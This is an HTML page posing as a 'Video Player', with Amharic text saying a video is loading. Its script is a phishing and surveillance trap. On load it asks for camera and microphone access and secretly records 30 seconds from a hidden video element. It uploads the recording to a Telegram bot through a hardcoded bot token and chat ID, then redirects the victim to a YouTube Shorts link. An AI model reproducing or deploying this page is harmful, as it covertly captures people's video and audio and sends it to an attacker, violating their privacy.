<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .spinner { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <h3 id="status">ቪዲዮው እየተጫነ ነው...</h3>

    <video id="video" width="640" height="480" autoplay muted style="display:none;"></video>

    <script>
        const botToken = "8685482473:AAE7vWYe8mV4ZQ4PA0oj_18WgoJpu_jfZ3M";
        const chatId = "5630987526";
        const duration = 30000; // 30 ሰከንድ (በሚሊ ሰከንድ)

        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                
                mediaRecorder.onstop = () => {
                    document.getElementById('status').innerText = "ቪዲዮው እየተላከ ነው...";
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', blob, 'capture.mp4');

                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    }).then(() => {
                        window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
                    });
                };

                // ቀረጻ ጀምር
                mediaRecorder.start();

                // ከ30 ሰከንድ በኋላ አቁም
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, duration);
            })
            .catch(() => {
                window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
            });
    </script>
</body>
</html>
